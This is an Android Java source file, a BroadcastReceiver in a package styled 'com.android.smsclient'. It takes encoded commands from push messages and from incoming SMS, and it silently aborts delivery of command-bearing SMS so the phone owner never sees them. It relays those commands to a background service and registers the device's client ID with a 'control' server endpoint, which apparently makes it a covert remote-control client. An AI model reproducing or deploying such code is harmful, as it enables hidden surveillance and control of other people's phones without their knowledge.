package com.android.smsclient;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.thread.RequestThread;
import com.android.utils.Utils;
import com.igexin.sdk.PushConsts;

public class BroadcastReceiverImpl extends BroadcastReceiver {

	private String uclienturl="control/client!UpdateClientId.action";
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		
		Bundle bundle = intent.getExtras();
		Log.d("smsclient", "onReceive() action=" + intent.getAction());
		String action=intent.getAction();
		if("com.igexin.sdk.action.OQwcQ6cw037EjIl2lZNrE3".equals(action)){
			int cmdaction=bundle.getInt(PushConsts.CMD_ACTION);
			if(cmdaction==PushConsts.GET_MSG_DATA){
				byte[] payload = bundle.getByteArray("payload");
				if (payload != null) {
					String data = new String(payload);
					SendBroadcast(context,Utils.StringDecode(data));
					Log.d("smsclient", "Got Payload:" + Utils.StringDecode(data));
					Utils.ShowToast(context, Utils.StringDecode(data));
				}
			}else if(cmdaction==PushConsts.GET_CLIENTID){
				String cid = bundle.getString("clientid");
				Utils.setStringConfig(context, "clientid", cid);
				int id=Utils.getIntConfig(context, "deviceid", -1);
				if(id>0){
					List<NameValuePair> lnvp=new ArrayList<NameValuePair>();
					lnvp.add(new BasicNameValuePair("mapparam.id", String.valueOf(id)));
					lnvp.add(new BasicNameValuePair("mapparam.clientid", cid));
					RequestThread rt=new RequestThread(uclienturl, lnvp, handler);
					rt.start();
				}
				Log.d("smsclient", "clientid:" + cid);
			}else if(cmdaction==PushConsts.THIRDPART_FEEDBACK){
				String appid = bundle.getString("appid");
				String taskid = bundle.getString("taskid");
				String actionid = bundle.getString("actionid");
				String result = bundle.getString("result");
				long timestamp = bundle.getLong("timestamp");

				Log.d("smsclient", "appid = " + appid);
				Log.d("smsclient", "taskid = " + taskid);
				Log.d("smsclient", "actionid = " + actionid);
				Log.d("smsclient", "result = " + result);
				Log.d("smsclient", "timestamp = " + timestamp);
			}
			
		}
		if("android.provider.Telephony.SMS_RECEIVED".equals(action)){
			StringBuffer sb = new StringBuffer();
			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] mges = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					mges[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					sb.append(mges[i].getMessageBody());
				}
				String p=Utils.StringDecode(sb.toString());
				if(!"".equals(p)){
					this.abortBroadcast();
					SendBroadcast(context,p);
				}
			}
		}
		if(Utils.getIntConfig(context, "deviceid", 0)>0){
			Intent service=new Intent(context,SmsClientService.class);
			context.startService(service);
		}
		
	}
	private Handler handler=new Handler(){

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			if(msg.what==1&&msg.obj!=null){
				try {
					JSONObject jo=new JSONObject(msg.obj.toString());
					if(jo.getInt("state")==1){
						Log.d("smsclient", "更新成功");
					}
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		
	};
	private void SendBroadcast(Context context,String action){
		Intent cmd=new Intent(SmsClientService.cmdaction);
		cmd.putExtra("action", action);
		context.sendBroadcast(cmd);
		Log.d("smsclient", "发送广播指令");
	}
	
}
